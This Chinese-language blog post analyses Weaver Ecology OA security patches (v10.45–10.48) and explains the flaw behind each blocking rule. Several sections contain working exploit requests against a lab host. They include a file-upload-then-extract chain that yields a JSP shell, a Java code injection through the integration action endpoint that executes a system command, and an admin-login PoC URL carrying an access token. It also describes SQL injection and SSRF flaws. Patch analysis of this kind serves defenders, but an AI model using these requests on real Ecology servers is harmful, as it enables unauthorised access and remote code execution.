<h5 id="x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-export"><a href="#x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-export" class="headerlink" title="&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;export"></a>&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;export</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215648647.png"><br>拦截任意文件下载<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215648934.png"></p>
<h5 id="x2F-api-x2F-edc-x2F-dataexport-x2F-export"><a href="#x2F-api-x2F-edc-x2F-dataexport-x2F-export" class="headerlink" title="&#x2F;api&#x2F;edc&#x2F;dataexport&#x2F;export"></a>&#x2F;api&#x2F;edc&#x2F;dataexport&#x2F;export</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215649246.png"><br>拦截任意文件下载<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215649500.png"></p>
<h4 id="SercurityRuleForCptInventory"><a href="#SercurityRuleForCptInventory" class="headerlink" title="SercurityRuleForCptInventory"></a>SercurityRuleForCptInventory</h4><h5 id="x2F-api-x2F-cpt-x2F-inventory-x2F-docptimpoptinventory"><a href="#x2F-api-x2F-cpt-x2F-inventory-x2F-docptimpoptinventory" class="headerlink" title="&#x2F;api&#x2F;cpt&#x2F;inventory&#x2F;docptimpoptinventory"></a>&#x2F;api&#x2F;cpt&#x2F;inventory&#x2F;docptimpoptinventory</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215649754.png"><br>拦截该路径并进行附件后缀校验<br>为任意文件上传链子中的第二步释放功能<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215650002.png"></p>
<h5 id="x2F-api-x2F-cpt-x2F-exceltodb-x2F-importdata"><a href="#x2F-api-x2F-cpt-x2F-exceltodb-x2F-importdata" class="headerlink" title="&#x2F;api&#x2F;cpt&#x2F;exceltodb&#x2F;importdata"></a>&#x2F;api&#x2F;cpt&#x2F;exceltodb&#x2F;importdata</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215650323.png"><br>拦截该路径并进行附件后缀校验<br>为任意文件上传链子中的第二步释放功能<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215650600.png"></p>
<h5 id="x2F-api-x2F-cpt-x2F-exceltodb-x2F-importassort"><a href="#x2F-api-x2F-cpt-x2F-exceltodb-x2F-importassort" class="headerlink" title="&#x2F;api&#x2F;cpt&#x2F;exceltodb&#x2F;importassort"></a>&#x2F;api&#x2F;cpt&#x2F;exceltodb&#x2F;importassort</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215650842.png"><br>拦截该路径并进行附件后缀校验<br>为任意文件上传链子中的第二步释放功能<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215651121.png"></p>
<h4 id="SercurityRuleForOdoc"><a href="#SercurityRuleForOdoc" class="headerlink" title="SercurityRuleForOdoc"></a>SercurityRuleForOdoc</h4><p>拦截<code>/officeserver</code>、<code>/officeserver.jsp</code> 任意文件上传<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215651402.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215651684.png"></p>
<h3 id="Ecology-security-20220525-v10-45"><a href="#Ecology-security-20220525-v10-45" class="headerlink" title="Ecology_security_20220525_v10.45"></a>Ecology_security_20220525_v10.45</h3><h4 id="删除findclassfromjar-jsp逻辑"><a href="#删除findclassfromjar-jsp逻辑" class="headerlink" title="删除findclassfromjar.jsp逻辑"></a>删除findclassfromjar.jsp逻辑</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215651918.png"></p>
<h4 id="SecurityRule20220429"><a href="#SecurityRule20220429" class="headerlink" title="SecurityRule20220429"></a>SecurityRule20220429</h4><p>拦截<code>/api/formmode/page/action||proxy</code>路径，9无此路径</p>
<h4 id="SecurityRuleForAPI"><a href="#SecurityRuleForAPI" class="headerlink" title="SecurityRuleForAPI"></a>SecurityRuleForAPI</h4><p>修复API大小写权限绕过问题<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215652189.png"></p>
<h4 id="SecurityRuleForHttpForward"><a href="#SecurityRuleForHttpForward" class="headerlink" title="SecurityRuleForHttpForward"></a>SecurityRuleForHttpForward</h4><p>拦截<code>/api/ec/dev/http/forward</code>路径，一处授权SSRF<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215652468.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215652780.png"></p>
<h4 id="SecurityRuleForMecAction"><a href="#SecurityRuleForMecAction" class="headerlink" title="SecurityRuleForMecAction"></a>SecurityRuleForMecAction</h4><p>修复<code>mobilebode/action.jsp</code>调用任意类，此处拉黑<code>com.weaver.formmodel.mobile.mec.servlet.MECAction</code>的<code>action</code>为<code>customQuery</code>方法，9无此方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215653335.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215653581.png"></p>
<h4 id="SecurityRuleForNewsTemplateAction0424"><a href="#SecurityRuleForNewsTemplateAction0424" class="headerlink" title="SecurityRuleForNewsTemplateAction0424"></a>SecurityRuleForNewsTemplateAction0424</h4><p>拦截<code>/api/portal/newsTemplate/setNewsTemplate</code>，需要配合<code>uploadNewsTemplate</code>任意文件上传洞利用 可getshell<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215653801.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/portal/newsTemplate/uploadNewsTemplate HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.6.0</span><br><span class="line">Cookie: ecology_JSessionid=aaaYlT22RJ-pL_enuRwry</span><br><span class="line">Content-Type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 335</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--X-INSOMNIA-BOUNDARY</span><br><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;test.zip&quot;</span><br><span class="line">Content-Type: application/zip</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215654027.png"><br>返回<code>fileid</code>和<code>filename</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215654247.png"><br>然后发送</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/portal/newsTemplate/setNewsTemplate HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaYlT22RJ-pL_enuRwry; JSESSIONID=aaaYlT22RJ-pL_enuRwry; loginidweaver=1; languageidweaver=7; loginuuids=1; __randcode__=cd182802-f22d-49fb-a055-9190742532a3</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">filename=test.zip&amp;fileid=1669601214137</span><br></pre></td></tr></table></figure>
<p>即可解压在<code>page\news\[fileid]\xxx.jsp</code>下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215654509.png"><br>访问即可<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215654785.png"></p>
<h4 id="SecurityRuleForSearchTM"><a href="#SecurityRuleForSearchTM" class="headerlink" title="SecurityRuleForSearchTM"></a>SecurityRuleForSearchTM</h4><p>拦截<code>/api/dev/search/datas||/export</code>路径，为一处任意SQL语句执行漏洞<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215655016.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215655260.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215655532.png"></p>
<h4 id="SecurityRuleForSrc0416"><a href="#SecurityRuleForSrc0416" class="headerlink" title="SecurityRuleForSrc0416"></a>SecurityRuleForSrc0416</h4><p>拦截<code>&quot;/api/integration/datasource/insert||/update&quot;</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215655775.png"><br>涉及到的操作新增和修改数据源<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215655999.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215656243.png"></p>
<h4 id="SecurityRuleForSystemImportUpload"><a href="#SecurityRuleForSystemImportUpload" class="headerlink" title="SecurityRuleForSystemImportUpload"></a>SecurityRuleForSystemImportUpload</h4><p>拦截<code>/api/systemExpAndImp/systemImport/doSystemImport</code>为一处解压文件，配合任意文件上传可<code>getshell</code>，如<code>/api/doc/upload/uploadFile</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215656468.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215656741.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215656983.png"></p>
<h4 id="SecurityRuleForSYUploadLog"><a href="#SecurityRuleForSYUploadLog" class="headerlink" title="SecurityRuleForSYUploadLog"></a>SecurityRuleForSYUploadLog</h4><p>拦截<code>/api/common/log/audit/uploadxml</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215657210.png"><br>一处任意文件上传<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215657468.png"><br>测试<code>sysadmin</code>无权限，需要有<code>sanyuanAdmin</code>权限，找了圈没找到在哪能配</p>
<h4 id="SecurityRuleNetworkDisk"><a href="#SecurityRuleNetworkDisk" class="headerlink" title="SecurityRuleNetworkDisk"></a>SecurityRuleNetworkDisk</h4><p>拦截路径中以<code>api</code>起始，或路径中含有<code>messageservlet</code>或<code>weaver</code>或路径为<code>weaver.file.networkdisk.networkdiskfiledownload&quot;</code>且路径中含有 <code>weaver.</code>的路径<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215657727.png"></p>
<h4 id="SercurityRuleForCptInventoryListImp"><a href="#SercurityRuleForCptInventoryListImp" class="headerlink" title="SercurityRuleForCptInventoryListImp"></a>SercurityRuleForCptInventoryListImp</h4><p>拦截路径为<code>api/cpt/inventory/inventoryListImp</code>的请求<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215657958.png"><br>为一处解压文件，配合任意文件上传可getshell<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215658201.png"></p>
<h4 id="SercurityRuleForHrmInventoryListImp"><a href="#SercurityRuleForHrmInventoryListImp" class="headerlink" title="SercurityRuleForHrmInventoryListImp"></a>SercurityRuleForHrmInventoryListImp</h4><p>拦截路径为<code>/api/hrm/(plsmanager||annualmanager)/saveImport</code>的请求<br>为解压文件，配合任意文件上传可getshell<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215658492.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215658754.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/doc/upload/uploadFile HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.6.0</span><br><span class="line">Cookie: ecology_JSessionid=aaaYlT22RJ-pL_enuRwry</span><br><span class="line">Content-Type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 222</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--X-INSOMNIA-BOUNDARY</span><br><span class="line">Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;86825dba7134a9cabe5500b5fc487e9b.jsp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;% out.println(&quot;Hello world&quot;);%&gt;</span><br><span class="line">--X-INSOMNIA-BOUNDARY--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: WVS</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">X-XSS-Protection: 1</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Connection: close</span><br><span class="line">Date: Mon, 28 Nov 2022 02:13:48 GMT</span><br><span class="line">Content-Length: 1032</span><br><span class="line"></span><br><span class="line">&#123;&quot;data&quot;:&#123;&quot;fileExtendName&quot;:&quot;jsp&quot;,&quot;isImg&quot;:&quot;&quot;,&quot;filelink&quot;:&quot;/spa/document/index2file.jsp?imagefileId=706#/main/document/fileView&quot;,&quot;uploaddate&quot;:&quot;2022-11-28 10:13:48&quot;,&quot;showLoad&quot;:&quot;true&quot;,&quot;acclink&quot;:&quot;/weaver/weaver.file.FileDownload?fileid=a92b3b0341074e886e2c6a4b5d2c5a0463a4d236ed3017f911bad35e8f93605fa9f0b984130538f0cbdf6a86f0d4ede014f710fbddd167603&quot;,&quot;filesize&quot;:&quot;220B&quot;,&quot;loadlink&quot;:&quot;/weaver/weaver.file.FileDownload?fileid=a92b3b0341074e886e2c6a4b5d2c5a0463a4d236ed3017f911bad35e8f93605fa9f0b984130538f0cbdf6a86f0d4ede014f710fbddd167603&amp;download=1&quot;,&quot;secretLevel&quot;:&quot;4&quot;,&quot;filename&quot;:&quot;86825dba7134a9cabe5500b5fc487e9b.jsp&quot;,&quot;fileidCode&quot;:&quot;a92b3b0341074e886e2c6a4b5d2c5a0463a4d236ed3017f911bad35e8f93605fa9f0b984130538f0cbdf6a86f0d4ede014f710fbddd167603&quot;,&quot;secretLevelValidity&quot;:&quot;&quot;,&quot;showDelete&quot;:&quot;false&quot;,&quot;imgSrc&quot;:&quot;/weaver/weaver.file.FileDownload?fileid=a92b3b0341074e886e2c6a4b5d2c5a0463a4d236ed3017f911bad35e8f93605fa9f0b984130538f0cbdf6a86f0d4ede014f710fbddd167603&quot;,&quot;secretLevelValidityValue&quot;:&quot;&quot;,&quot;fileid&quot;:706,&quot;username&quot;:&quot;系统管理员&quot;&#125;,&quot;status&quot;:1&#125;</span><br></pre></td></tr></table></figure>
<p>利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/hrm/plsmanager/saveImport HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.6.0</span><br><span class="line">Cookie: ecology_JSessionid=aaaYlT22RJ-pL_enuRwry</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 13</span><br><span class="line"></span><br><span class="line">excelfile=707</span><br></pre></td></tr></table></figure>
<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: WVS</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">X-XSS-Protection: 1</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Connection: close</span><br><span class="line">Date: Mon, 28 Nov 2022 03:41:19 GMT</span><br><span class="line">Content-Length: 87</span><br><span class="line"></span><br><span class="line">&#123;&quot;errorInfo&quot;:[&quot;必须上传.xls格式的文件&quot;],&quot;message&quot;:&quot;导入完成&quot;,&quot;status&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /hrm/ExcelToDB/86825dba7134a9cabe5500b5fc487e9b.jsp HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.6.0</span><br><span class="line">Cookie: ecology_JSessionid=aaaYlT22RJ-pL_enuRwry</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215658992.png"></p>
<h3 id="Ecology-security-20220618-v10-47"><a href="#Ecology-security-20220618-v10-47" class="headerlink" title="Ecology_security_20220618_v10.47"></a>Ecology_security_20220618_v10.47</h3><h4 id="SecurityRuleCloudStore0706"><a href="#SecurityRuleCloudStore0706" class="headerlink" title="SecurityRuleCloudStore0706"></a>SecurityRuleCloudStore0706</h4><p>拦截<code>/api/ec/dev/util/clearaccesspage</code>、<code>/api/ec/dev/search/count</code>、<code>/api/ec/mode/search/config</code>路径</p>
<h5 id="x2F-api-x2F-ec-x2F-dev-x2F-util-x2F-clearaccesspage"><a href="#x2F-api-x2F-ec-x2F-dev-x2F-util-x2F-clearaccesspage" class="headerlink" title="&#x2F;api&#x2F;ec&#x2F;dev&#x2F;util&#x2F;clearaccesspage"></a>&#x2F;api&#x2F;ec&#x2F;dev&#x2F;util&#x2F;clearaccesspage</h5><p>注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215659260.png"></p>
<h5 id="x2F-api-x2F-ec-x2F-dev-x2F-search-x2F-count"><a href="#x2F-api-x2F-ec-x2F-dev-x2F-search-x2F-count" class="headerlink" title="&#x2F;api&#x2F;ec&#x2F;dev&#x2F;search&#x2F;count"></a>&#x2F;api&#x2F;ec&#x2F;dev&#x2F;search&#x2F;count</h5><p>任意SQL执行<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215659533.png"></p>
<h5 id="x2F-api-x2F-ec-x2F-mode-x2F-search-x2F-config"><a href="#x2F-api-x2F-ec-x2F-mode-x2F-search-x2F-config" class="headerlink" title="&#x2F;api&#x2F;ec&#x2F;mode&#x2F;search&#x2F;config"></a>&#x2F;api&#x2F;ec&#x2F;mode&#x2F;search&#x2F;config</h5><p>任意SQL执行<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215659800.png"></p>
<h4 id="SecurityRuleForWeb0704"><a href="#SecurityRuleForWeb0704" class="headerlink" title="SecurityRuleForWeb0704"></a>SecurityRuleForWeb0704</h4><p>后台任意用户登录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215700057.png"><br>登管理员POC，<code>10.45</code>之前可任意登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/integration/oauth2/profile?client_id=2ad1b008-38ed-44e4-a113-ef1ee31407c1&amp;client_secret=L68GFSAH3EBT&amp;access_token=565ED729CDDEC4511412B7BF4419B0CB40201AC69A61AA9F5DD0688064E5DE6B339B72B8B98D5AD65B5269ADF9747AF3C162D65D34CB600600C229A750826D5A227297EF7EB25AE651B8D15E185FE30D</span><br></pre></td></tr></table></figure>
<h4 id="SercurityRuleForGovern"><a href="#SercurityRuleForGovern" class="headerlink" title="SercurityRuleForGovern"></a>SercurityRuleForGovern</h4><p>对路径<code>/api/govern/base/doImport</code>进行拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215700319.png"><br>对excel参数校验是否为合法文件名，测试后正常JSP无法正常解压</p>
<h4 id="SercurityRuleForIntegrationAction"><a href="#SercurityRuleForIntegrationAction" class="headerlink" title="SercurityRuleForIntegrationAction"></a>SercurityRuleForIntegrationAction</h4><p>拦截<code>/api/integration/workflowflow/getInterfaceRegisterCustomOperation</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215700602.png"><br>分析后是一个后台远程代码执行<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215700856.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215701111.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/integration/workflowflow/getInterfaceRegisterCustomOperation HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.6.0</span><br><span class="line">Cookie: ecology_JSessionid=aaaYlT22RJ-pL_enuRwry</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 511</span><br><span class="line"></span><br><span class="line">method=add&amp;classname=weaver.interfaces.workflow.action.javacode.Action.weaver.interfaces.workflow.action.javacode.testCalc&amp;actionid=1&amp;dtinfo_CustomParameterData=&#123;&quot;&quot;:&amp;javaCode=package weaver.interfaces.workflow.action.javacode.Action.weaver.interfaces.workflow.action.javacode;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">public class testCalc&#123;</span><br><span class="line">static&#123; try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;cmd /c calc.exe&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215701372.png"></p>
<h4 id="securityagenttest-jsp置空"><a href="#securityagenttest-jsp置空" class="headerlink" title="securityagenttest.jsp置空"></a>securityagenttest.jsp置空</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215701657.png"><br>后台超管SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215701902.png"></p>
<h3 id="Ecology-security-20220716-v10-48"><a href="#Ecology-security-20220716-v10-48" class="headerlink" title="Ecology_security_20220716_v10.48"></a>Ecology_security_20220716_v10.48</h3><h4 id="SercurityRuleForIntegrationBrowser"><a href="#SercurityRuleForIntegrationBrowser" class="headerlink" title="SercurityRuleForIntegrationBrowser"></a>SercurityRuleForIntegrationBrowser</h4><p>加黑<code>/api/integration/data/show/getDataShowOperation</code>（无这个路径，唯一相近的是<code>/api/integration/datashow/getDataShowOperation</code>），对<code>searchById</code>、<code>sqltext</code>进行合法性校验，判断是否存在<code>;</code>、<code>--</code>、<code>/</code>，存在则拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215702198.png"><br>一处sql注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215702463.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215702743.png"></p>
<h4 id="SercurityRuleForSourceFileds"><a href="#SercurityRuleForSourceFileds" class="headerlink" title="SercurityRuleForSourceFileds"></a>SercurityRuleForSourceFileds</h4><p>拉黑<code>/api/mobilemode/admin/designer/plugin/getSourceFields</code>和<code>/api/integration/imrtx/save</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215703069.png"></p>
<h5 id="x2F-api-x2F-mobilemode-x2F-admin-x2F-designer-x2F-plugin-x2F-getSourceFields"><a href="#x2F-api-x2F-mobilemode-x2F-admin-x2F-designer-x2F-plugin-x2F-getSourceFields" class="headerlink" title="&#x2F;api&#x2F;mobilemode&#x2F;admin&#x2F;designer&#x2F;plugin&#x2F;getSourceFields"></a>&#x2F;api&#x2F;mobilemode&#x2F;admin&#x2F;designer&#x2F;plugin&#x2F;getSourceFields</h5><p>返回列名的任意SQL执行，DNS外带数据<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215703428.png"></p>
